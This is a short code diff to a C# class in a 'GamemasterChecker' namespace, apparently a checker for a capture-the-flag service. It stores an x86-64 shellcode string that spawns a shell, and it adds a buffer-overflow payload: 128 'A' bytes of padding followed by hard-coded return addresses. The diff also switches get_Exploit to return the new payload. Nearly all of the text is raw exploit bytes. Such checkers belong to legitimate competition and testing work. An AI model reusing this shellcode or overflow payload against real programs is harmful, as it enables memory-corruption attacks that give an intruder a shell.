@@ -13,11 +13,12 @@ namespace GamemasterChecker
     {
         private static readonly string[] exploits = new string[]
         {
-            "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+            "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0\0\0\0\x40\x13\x91\0\0\0\0\0\x40\x04\x77\0\0\0\0\0\x40\x03\x91\0\0\x7f\xf7\x55\xed\x74"
         };
         public static string get_Exploit ()
         {
-            return exploits[0];
+            return exploits[1];
         }
         public static string GetFakeSession()
         {
